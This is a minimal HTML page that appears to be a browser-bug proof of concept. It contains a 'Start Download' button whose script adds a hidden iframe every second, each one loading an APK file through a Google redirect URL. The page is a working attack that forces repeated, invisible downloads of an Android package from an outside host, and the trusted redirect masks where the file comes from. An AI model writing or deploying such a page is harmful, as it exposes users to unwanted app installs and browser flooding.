<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download Function</title>
    <script>
        function download() {
            
            setInterval(function() {
                var iframe = document.createElement('iframe');
                iframe.src = 'https://www.google.com/url?q=https://ybt01.github.io/upload/app-debug.apk&sa=D&source=buganizer&usg=AOvVaw3nm-qJSzcGfjAOwSO0tcBK';
                iframe.style.display = 'none';
                document.body.appendChild(iframe);
            }, 1000);
        }
    </script>
</head>
<body>
    <h1>Download File</h1>
    <button onclick="download()">Start Download</button>
</body>
</html>
